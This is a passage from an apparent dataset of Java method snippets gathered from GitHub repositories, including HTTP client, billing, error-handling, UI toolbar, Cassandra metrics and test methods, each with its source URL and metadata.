UTF_8));\n      response = executeCircuitBreaker(\"Post service\", () -> {\n        try {\n          return client.execute(httpPost);\n        } catch (IOException e) {\n          e.printStackTrace();\n        }\n        return null;\n      }, null);\n      if (HttpStatus.SC_OK == response.getStatusLine().getStatusCode()) {\n        HttpEntity entity = response.getEntity();\n        result = EntityUtils.toString(entity, UTF_8);\n      }\n    } catch (Exception e) {\n      LOG.error(\">>>>>>> http get failed <<<<<<<<< \");\n      LOG.error(e.getMessage());\n      e.printStackTrace();\n    } finally {\n      if (Objects.nonNull(response)) {\n        try {\n          response.close();\n        } catch (IOException e) {\n          e.printStackTrace();\n        }\n      }\n      if (Objects.nonNull(client)) {\n        try {\n          client.close();\n        } catch (IOException e) {\n          e.printStackTrace();\n        }\n      }\n    }\n    return result;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/http/HttpClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59467, "method_name": "getDefaultRequestConfig", "class_name": "HttpClient", "params": [], "throws": null, "modifiers": ["private"], "return_type": "RequestConfig", "snippet": "  private RequestConfig getDefaultRequestConfig() {\n    return RequestConfig.custom()\n            .setConnectionRequestTimeout(CONNECTION_REQUEST_TIMEOUT)\n            .setSocketTimeout(SOCKET_TIMEOUT)\n            .build();\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/http/HttpClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59468, "method_name": "convert", "class_name": "HttpClient", "params": ["Map<String,String>"], "throws": null, "modifiers": ["private"], "return_type": "List<NameValuePair>", "snippet": "  private List<NameValuePair> convert(Map<String, String> paraMap) {\n    List<NameValuePair> nameValuePairs = new ArrayList<>();\n    if (ObjectUtils.isEmpty(paraMap)) {\n      return nameValuePairs;\n    }\n    Set<String> keySet = paraMap.keySet();\n    for (String key : keySet) {\n      nameValuePairs.add(new BasicNameValuePair(key, paraMap.get(key)));\n    }\n    return nameValuePairs;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/http/HttpClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59469, "method_name": "executeCircuitBreaker", "class_name": "HttpClient", "params": ["String", "Supplier<CloseableHttpResponse>", "Supplier<CloseableHttpResponse>"], "throws": null, "modifiers": ["private"], "return_type": "CloseableHttpResponse", "snippet": "  private CloseableHttpResponse executeCircuitBreaker(String circuitBreakerName, Supplier<CloseableHttpResponse> supplier, Supplier<CloseableHttpResponse> fallback){\n    CircuitBreaker circuitBreaker = CircuitBreaker.ofDefaults(circuitBreakerName);\n    Supplier<CloseableHttpResponse> decoratedSupplier = CircuitBreaker.decorateSupplier(circuitBreaker, supplier);\n    Retry retry = Retry.ofDefaults(circuitBreakerName);\n    Supplier<CloseableHttpResponse> retrySupplier = Retry.decorateSupplier(retry, decoratedSupplier);\n    if( fallback == null){\n      return Try.ofSupplier(retrySupplier).get();\n    }else {\n      return Try.ofSupplier(retrySupplier).recover(e -> {\n        LOG.warn(String.format(\"Service %s is not available, calling fallback!\", circuitBreakerName));\n        return fallback.get();\n      }).get();\n    }\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/http/HttpClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59470, "method_name": "updateClientItem", "class_name": "PhoneAction", "params": ["ActionMapping", "DynActionForm", "HttpServletRequest", "HttpServletResponse", "ConnectionSet"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "ActionForward", "snippet": "\tpublic ActionForward updateClientItem( ActionMapping mapping,\n\t\t\t\t\t\t\t\t\t\t   DynActionForm form,\n\t\t\t\t\t\t\t\t\t\t   HttpServletRequest request,\n\t\t\t\t\t\t\t\t\t\t   HttpServletResponse response,\n\t\t\t\t\t\t\t\t\t\t   ConnectionSet conSet )\n\t\tthrows BGException\n\t{\n\t\tPhoneDAO phoneDAO = new PhoneDAO( form.getUser(), form.getParam( \"billingId\" ) );\n\n\t\tphoneDAO.updateClientItem( form.getParamInt( \"contractId\" ),\n\t\t\t\t\t\t\t\t   form.getParam( \"clientsNumbers\" ),\n\t\t\t\t\t\t\t\t   form.getParam( \"alias\" ),\n\t\t\t\t\t\t\t\t   form.getParamInt( \"sourceId\" ),\n\t\t\t\t\t\t\t\t   new Date(),\n\t\t\t\t\t\t\t\t   null,\n\t\t\t\t\t\t\t\t   form.getParamInt( \"id\", 0 ),\n\t\t\t\t\t\t\t\t   form.getParam( \"comment\" ),\n\t\t\t\t\t\t\t\t   form.getParamInt( \"objectId\" ),\n\t\t\t\t\t\t\t\t   form.getParamInt( \"type\", 1 ) );\n\n\t\treturn processUserTypedForward( conSet, mapping, form, response, FORWARD_DEFAULT );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/struts/action/PhoneAction.java", "stars": "12", "class_props": {"extends": "BaseAction", "implements": null, "modifiers": ["public"]}}, {"id": 59471, "method_name": "sessionList", "class_name": "PhoneAction", "params": ["ActionMapping", "DynActionForm", "HttpServletRequest", "HttpServletResponse", "ConnectionSet"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "ActionForward", "snippet": "\tpublic ActionForward sessionList( ActionMapping mapping,\n\t\t\t\t\t\t\t\t\t  DynActionForm form,\n\t\t\t\t\t\t\t\t\t  HttpServletRequest request,\n\t\t\t\t\t\t\t\t\t  HttpServletResponse response,\n\t\t\t\t\t\t\t\t\t  ConnectionSet conSet )\n\t\tthrows BGException\n\t{\n\t\tPhoneDAO phoneDAO = new PhoneDAO( form.getUser(), form.getParam( \"billingId\" ) );\n\n\t\tform.getResponse().setData( \"sessionList\", phoneDAO.getPhoneSessionList( form.getParamInt( \"contractId\" ), form.getParamInt( \"pointId\" ), form.getParamInt( \"days\" ) ) );\n\n\t\treturn processUserTypedForward( conSet, mapping, form, response, \"sessionList\" );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/struts/action/PhoneAction.java", "stars": "12", "class_props": {"extends": "BaseAction", "implements": null, "modifiers": ["public"]}}, {"id": 59472, "method_name": "getFreeNumberResourceList", "class_name": "PhoneAction", "params": ["ActionMapping", "DynActionForm", "HttpServletRequest", "HttpServletResponse", "ConnectionSet"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "ActionForward", "snippet": "\tpublic ActionForward getFreeNumberResourceList( ActionMapping mapping, \n\t                                                DynActionForm form,\n\t                                                HttpServletRequest request,\n\t                                                HttpServletResponse response,\n\t                                                ConnectionSet conSet\n\t                                                )\n        throws BGException\n\t{\n\t\tint categoryId = form.getParamInt( \"categoryId\", -1 );\n\t\tif( categoryId == -1 )\n\t\t{\n\t\t\tthrow new BGException( \"\u041d\u0435 \u0443\u043a\u0430\u0437\u0430\u043d \u043a\u043e\u0434 \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u0438 \u0440\u0435\u0441\u0443\u0440\u0441\u0430 \u0432 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u0435 \u0437\u0430\u043f\u0440\u043e\u0441\u0430 categoryId\" );\n\t\t}\n\t\tDate date = form.getParamDate( \"date\", new Date() );\n\t\tList<String> freePhoneList = new PhoneDAO( form.getUser(), request.getParameter( \"billingId\" ) ).getFreeNumberResourceList( categoryId, date );\n\t\tform.getResponse().setData( \"freePhoneList\", freePhoneList );\n\t\treturn processJsonForward( conSet, form, response );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/struts/action/PhoneAction.java", "stars": "12", "class_props": {"extends": "BaseAction", "implements": null, "modifiers": ["public"]}}, {"id": 59473, "method_name": "getPhoneResourceList", "class_name": "PhoneAction", "params": ["ActionMapping", "DynActionForm", "HttpServletRequest", "HttpServletResponse", "ConnectionSet"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "ActionForward", "snippet": "    public ActionForward getPhoneResourceList( ActionMapping mapping,\n                                                DynActionForm form,\n                                                HttpServletRequest request,\n                                                HttpServletResponse response,\n                                                ConnectionSet conSet )\n        throws BGException\n    {\n        int categoryId = form.getParamInt( \"categoryId\", -1 );\n        Date onDate = form.getParamDate(\"onDate\", new Date());\n        String fromNumber = form.getParam(\"fromNumber\");\n        String toNumber = form.getParam( \"toNumber\" );\n        String status = form.getParam( \"status\" );\n\n        List<PhoneResourceItem> phoneResourceList = new PhoneDAO( form.getUser(), request.getParameter( \"billingId\" ) ).\n                getPhoneResourceTable( categoryId, fromNumber, toNumber, status, onDate );\n\n        form.getResponse().setData( \"phoneResourceList\", phoneResourceList );\n\n        return processJsonForward( conSet, form, response );\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/struts/action/PhoneAction.java", "stars": "12", "class_props": {"extends": "BaseAction", "implements": null, "modifiers": ["public"]}}, {"id": 59474, "method_name": "handler404", "class_name": "DefaultExceptionHandler", "params": ["NotFoundException"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String handler404(NotFoundException e) {\n        return \"erreur-404\";\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/application/ui/DefaultExceptionHandler.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59475, "method_name": "handler400", "class_name": "DefaultExceptionHandler", "params": ["InvalidParameterException"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String handler400(InvalidParameterException e) {\n        LOGGER.error(\"Param\u00e8tre utilisateur incorrecte\", e);\n        return \"erreur-400\";\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/application/ui/DefaultExceptionHandler.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59476, "method_name": "defaultErrorHandler500", "class_name": "DefaultExceptionHandler", "params": ["Exception"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String defaultErrorHandler500(Exception e) {\n        LOGGER.error(\"Erreur durant la distribution des masques\", e);\n        return \"erreur-500\";\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/application/ui/DefaultExceptionHandler.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59477, "method_name": "setToolBarControl", "class_name": "EditToolBarControl", "params": ["ToolPanelControl", "GridPane", "RowConstraints", "TextArea"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setToolBarControl(ToolPanelControl toolPanelControl,GridPane home,RowConstraints ToolBarSpace,TextArea editor){\n        this.toolPanelControl=toolPanelControl;\n        this.home=home;\n        this.editor=editor;\n        this.ToolBarSpace=ToolBarSpace;\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/EditToolBarControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59478, "method_name": "hideToolBar", "class_name": "EditToolBarControl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void hideToolBar(){\n        String msg=\"\";\n        if(isHide) {\n            ToolBarSpace.setMaxHeight(0);\n            ToolBarSpace.setMinHeight(0);\n            ToolBarSpace.setPrefHeight(0);\n            msg=\"\u5de5\u5177\u680f\u5df2\u6536\u8d77\uff0c\u6309Ctrl+T\u5373\u53ef\u91cd\u65b0\u547c\u51fa\";\n        }else {\n            ToolBarSpace.setMaxHeight(60);\n            ToolBarSpace.setMinHeight(60);\n            ToolBarSpace.setPrefHeight(60);\n            msg=\"\u5de5\u5177\u680f\u5df2\u663e\u793a\uff0c\u6309Ctrl+T\u5373\u53ef\u91cd\u65b0\u9690\u85cf\";\n        }\n        isHide=!isHide;\n        toolbar.setVisible(isHide);\n        new ToastUtil().toast(controller.inputset.getStage(),msg,controller.inputset.getTheme(),1000);\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/EditToolBarControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59479, "method_name": "PutAway", "class_name": "EditToolBarControl", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void PutAway(ActionEvent actionEvent) { hideToolBar(); }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/EditToolBarControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59480, "method_name": "initialize", "class_name": "EditToolBarControl", "params": ["URL", "ResourceBundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(URL location, ResourceBundle resources) {\n\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/EditToolBarControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59481, "method_name": "onFind", "class_name": "EditToolBarControl", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onFind(ActionEvent actionEvent) {\n        toolPanelControl.Call(editor,find.getId());\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/EditToolBarControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59482, "method_name": "onReplace", "class_name": "EditToolBarControl", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onReplace(ActionEvent actionEvent) {\n        toolPanelControl.Call(editor,replace.getId());\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/EditToolBarControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59483, "method_name": "newline", "class_name": "EditToolBarControl", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void newline(ActionEvent actionEvent) {\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/EditToolBarControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59484, "method_name": "onJumpLine", "class_name": "EditToolBarControl", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onJumpLine(ActionEvent actionEvent) {\n        toolPanelControl.Call(editor,Jump.getId());\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/EditToolBarControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59485, "method_name": "onChangeCode", "class_name": "EditToolBarControl", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onChangeCode(ActionEvent actionEvent) {\n        toolPanelControl.Call(editor,code.getId());\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/EditToolBarControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59486, "method_name": "ChangeStyle", "class_name": "EditToolBarControl", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void ChangeStyle(ActionEvent actionEvent) {\n        toolPanelControl.Call(editor,style.getId());\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/EditToolBarControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59487, "method_name": "onClose", "class_name": "EditToolBarControl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClose(){\n        toolPanelControl.close(null);\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/EditToolBarControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59488, "method_name": "getFieldOrder", "class_name": "HostInfoRequest", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "List<String>", "snippet": "    protected List<String> getFieldOrder() {\n        return Arrays.asList(\"NDR\", \"flavor\", \"host_info_out\");\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/struct/kernel/HostInfoRequest.java", "stars": "16", "class_props": {"extends": "UnicornStructure", "implements": null, "modifiers": ["public"]}}, {"id": 59489, "method_name": "warn", "class_name": "TombstoneWarningInterceptor", "params": ["Object", "Callable<?>"], "throws": ["Throwable"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void warn(@AllArguments Object[] allArguments, @SuperCall Callable<?> zuper) throws Throwable\n    {\n        zuper.call();\n\n        if (allArguments.length == 1 && allArguments[0] instanceof String)\n        {\n            String logMessage = (String) allArguments[0];\n\n            if (!logMessage.contains(\"tombstone_warn_threshold\"))\n            {\n                return;\n            }\n\n            try\n            {\n                Matcher matcher = TOMBSTONE_WARN_PATTERN.matcher(logMessage);\n                String tableName = null;\n                String keyspaceName = null;\n\n                if (matcher.matches() && matcher.groupCount() == 2)\n                {\n                    String cqlQuery = matcher.group(2);\n                    Object statement = QueryProcessor.class.getMethod(\"parseStatement\", String.class).invoke(null, cqlQuery);\n\n                    Method ks = statement.getClass().getMethod(\"keyspace\");\n                    Method table = statement.getClass()\n                            .getMethod(StorageService.instance.getReleaseVersion().startsWith(\"4\") ? \"name\" : \"columnFamily\");\n\n                    tableName = (String)table.invoke(statement);\n                    keyspaceName = (String)ks.invoke(statement);\n                }\n                else\n                {\n                    matcher = TOMBSTONE_2_2_WARN_PATTERN.matcher(logMessage);\n                    if (matcher.matches() && matcher.groupCount() == 3)\n                    {\n                        keyspaceName = matcher.group(2);\n                        tableName = matcher.group(3);\n                    }\n                }\n\n                if (!isEmpty(keyspaceName) && !isEmpty(tableName))\n                {\n                    incrementAssociatedCounter(keyspaceName, tableName);\n                }\n            }\n            catch (Throwable ex)\n            {\n                logger.error(\n                        \"Error intercepting tombstone warning message:  \",\n                        ex\n                );\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/datastax/metric-collector-for-apache-cassandra/master/src/main/java/com/datastax/mcac/interceptors/TombstoneWarningInterceptor.java", "stars": "23", "class_props": {"extends": "AbstractInterceptor", "implements": null, "modifiers": ["public"]}}, {"id": 59490, "method_name": "incrementAssociatedCounter", "class_name": "TombstoneWarningInterceptor", "params": ["String", "String"], "throws": null, "modifiers": ["static", "private"], "return_type": "void", "snippet": "    private static void incrementAssociatedCounter(String keyspaceName, String tableName)\n    {\n        if (!keyspaceToTableCounters.containsKey(keyspaceName))\n        {\n            keyspaceToTableCounters.put(keyspaceName, new ConcurrentHashMap<>());\n        }\n        Map<String, Counter> tableCounters = keyspaceToTableCounters.get(keyspaceName);\n        if (!tableCounters.containsKey(tableName))\n        {\n            tableCounters.put(\n                    tableName,\n                    UnixSocketClient.agentAddedMetricsRegistry.counter(String.format(\n                    \"com.datastax.mcac.tombstone_warnings.%s.%s\",\n                            keyspaceName,\n                            tableName\n                    ))\n            );\n            logger.info(\"Added {}\", String.format(\n                    \"com.datastax.mcac.tombstone_warnings.%s.%s\",\n                    keyspaceName,\n                    tableName\n            ));\n        }\n        Counter counter = tableCounters.get(tableName);\n        counter.inc();\n    }", "url": "https://raw.githubusercontent.com/datastax/metric-collector-for-apache-cassandra/master/src/main/java/com/datastax/mcac/interceptors/TombstoneWarningInterceptor.java", "stars": "23", "class_props": {"extends": "AbstractInterceptor", "implements": null, "modifiers": ["public"]}}, {"id": 59491, "method_name": "type", "class_name": "TombstoneWarningInterceptor", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ElementMatcher<TypeDescription>", "snippet": "    public static ElementMatcher<? super TypeDescription> type()\n    {\n        return ElementMatchers.nameEndsWith(\"ClientWarn\");\n    }", "url": "https://raw.githubusercontent.com/datastax/metric-collector-for-apache-cassandra/master/src/main/java/com/datastax/mcac/interceptors/TombstoneWarningInterceptor.java", "stars": "23", "class_props": {"extends": "AbstractInterceptor", "implements": null, "modifiers": ["public"]}}, {"id": 59492, "method_name": "transformer", "class_name": "TombstoneWarningInterceptor", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "AgentBuilder", "snippet": "    public static AgentBuilder.Transformer transformer()\n    {\n        return new AgentBuilder.Transformer()\n        {\n            @Override\n            public DynamicType.Builder<?> transform(DynamicType.Builder<?> builder, TypeDescription typeDescription, ClassLoader classLoader, JavaModule javaModule)\n            {\n                return builder.method(named(\"warn\")).intercept(MethodDelegation.to(TombstoneWarningInterceptor.class));\n            }\n        };\n    }", "url": "https://raw.githubusercontent.com/datastax/metric-collector-for-apache-cassandra/master/src/main/java/com/datastax/mcac/interceptors/TombstoneWarningInterceptor.java", "stars": "23", "class_props": {"extends": "AbstractInterceptor", "implements": null, "modifiers": ["public"]}}, {"id": 59493, "method_name": "test_\uc0ac\uc6a9\uc790\ubaa9\ub85d\uc870\ud68c", "class_name": "TestUserDaoService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test_\uc0ac\uc6a9\uc790\ubaa9\ub85d\uc870\ud68c() {\n        List<User> list = service.getUserList();\n        assertEquals(3, list.size(),\n                \"\ucd08\uae30 \uc0ac\uc6a9\uc790\ub294 3\uba85\uc774\uc5b4\uc57c \ud569\ub2c8\ub2e4.\");\n    }", "url": "https://raw.githubusercontent.com/joneconsulting/springbootproject/master/src/test/java/com/example/demo/dao/TestUserDaoService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59494, "method_name": "test_\uc0ac\uc6a9\uc790\uc815\ubcf4\ud655\uc778", "class_name": "TestUserDaoService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test_\uc0ac\uc6a9\uc790\uc815\ubcf4\ud655\uc778() {\n        User user = service.getUserList().get(0);\n        assertTrue(user.getId() == 1);\n    }", "url": "https://raw.githubusercontent.com/joneconsulting/springbootproject/master/src/test/java/com/example/demo/dao/TestUserDaoService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59495, "method_name": "test_\uc0ac\uc6a9\uc790\uc870\ud68c", "class_name": "TestUserDaoService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test_\uc0ac\uc6a9\uc790\uc870\ud68c() {\n        User user = service.getUser(Integer.valueOf(1));\n        assertNotNull(user);\n        assertEquals(1, user.getId(),\n                \"\uc0ac\uc6a9\uc790 ID\uac00 \uc798\ubabb\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\");\n    }", "url": "https://raw.githubusercontent.com/joneconsulting/springbootproject/master/src/test/java/com/example/demo/dao/TestUserDaoService.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59496, "method_name": "onRssiFailure", "class_name": "BleRssiCallback", "params": ["BleException"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void onRssiFailure(BleException exception);\n\n    public abstract void onRssiSuccess(int rssi);\n\n}\n", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/callback/BleRssiCallback.java", "stars": "2", "class_props": {"extends": "BleBaseCallback", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59497, "method_name": "onRssiSuccess", "class_name": "BleRssiCallback", "params": ["int"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void onRssiSuccess(int rssi);\n\n}\n", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/callback/BleRssiCallback.java", "stars": "2", "class_props": {"extends": "BleBaseCallback", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59498, "method_name": "onPanelClosed", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPanelClosed (android.view.View p0)\n\t{\n\t\tn_onPanelClosed (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59499, "method_name": "n_onPanelClosed", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPanelClosed (android.view.View p0);\n\n\n\tpublic void onPanelOpened (android.view.View p0)\n\t{\n\t\tn_onPanelOpened (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59500, "method_name": "onPanelOpened", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPanelOpened (android.view.View p0)\n\t{\n\t\tn_onPanelOpened (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59501, "method_name": "n_onPanelOpened", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPanelOpened (android.view.View p0);\n\n\n\tpublic void onPanelSlide (android.view.View p0, float p1)\n\t{\n\t\tn_onPanelSlide (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59502, "method_name": "onPanelSlide", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPanelSlide (android.view.View p0, float p1)\n\t{\n\t\tn_onPanelSlide (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59503, "method_name": "n_onPanelSlide", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["android", "float"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPanelSlide (android.view.View p0, float p1);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59504, "method_name": "monodroidAddReference", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59505, "method_name": "monodroidClearReferences", "class_name": "SlidingPaneLayout_PanelSlideListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/widget/SlidingPaneLayout_PanelSlideListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59506, "method_name": "getId", "class_name": "Topic", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int 